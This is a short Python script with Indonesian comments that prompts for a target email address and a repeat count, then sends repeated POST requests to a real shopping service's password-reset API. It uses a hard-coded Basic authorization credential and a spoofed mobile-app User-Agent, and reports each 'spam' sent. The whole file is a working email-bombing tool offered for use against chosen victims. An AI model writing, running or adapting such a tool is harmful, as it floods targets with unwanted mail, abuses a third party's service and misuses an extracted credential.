import sys          #untuk fungsi pada terminal, seperti autoclick() dan exit()
import subprocess   #installing python module within code / script (tanpa requirements.txt)

try: #import Module
    import requests #POST, GET, & PUT URL API
    import time     #Untuk Informasi Waktu
    import random   #Untuk Random User
    import os       #Untuk "clear" pada terminal
    import urllib3  #Untuk HTTP Client pada python
    import json     #Agar body Request dapat dilihat dengan cara di print
    import base64   #Untuk variasi output
    import emot     #Untuk menambahkan emot
    import shutil
finally:
    import requests
    import urllib3
    from colorama import Fore,Back,init
    from requests import get,post
    from urllib import request
    from bs4 import BeautifulSoup as bs

from urllib3.exceptions import *
from bs4 import BeautifulSoup as bs
from pip._vendor.requests import post,get # Bisa langsung "from requests import post,get"

# Inisialisasi Variasi Warna Output Terminal.
hijau="\033[1;92m "
putih="\033[1;97m"
abu="\033[1;90m"
kuning="\033[1;93m"
ungu="\033[1;95m"
merah="\033[1;91m"
biru="\033[1;96m"

B = Fore.BLUE
W = Fore.WHITE
R = Fore.RED
G = Fore.GREEN
BL = Fore.BLACK
Y = Fore.YELLOW

email = input(f"{W}[{R}• {kuning}•{hijau}•{W}] {biru}Email Target {W}: ")
jum = int(input(f"{W}[{R}• {kuning}•{hijau}•{W}] {biru}Jumlah {W}: "))
for i in range(jum):
    kecipir = requests.post("https://api.kecipir.com/user/account/profile/forgot",headers={'Host':'api.kecipir.com','Authorization':'Basic bWF4aW11ejprM2MxcDFyYWRyVzIkMjQxOQ==','Cache-Control':'public, max-age=5','Content-Type':'application/x-www-form-urlencoded','Content-Length':'75','Accept-Encoding':'gzip, deflate','User-Agent':'okhttp/5.0.0-alpha.11'},data={"device":"b038edd6b131cd1f", "email":email ,"token":"noauth.android"}).text
    respon = json.loads(kecipir)
    if(respon['code'] == 200):
        print (f"{W}[{G}✓{W}][{G}{respon['code']}{W}] Success Sended Spam")
    else:
        print (f"{W}[{R}x{W}][{R}{respon['code']}{W}] {respon['message']}")
print (f"{W}[{G}✓{W}] Spam selesai")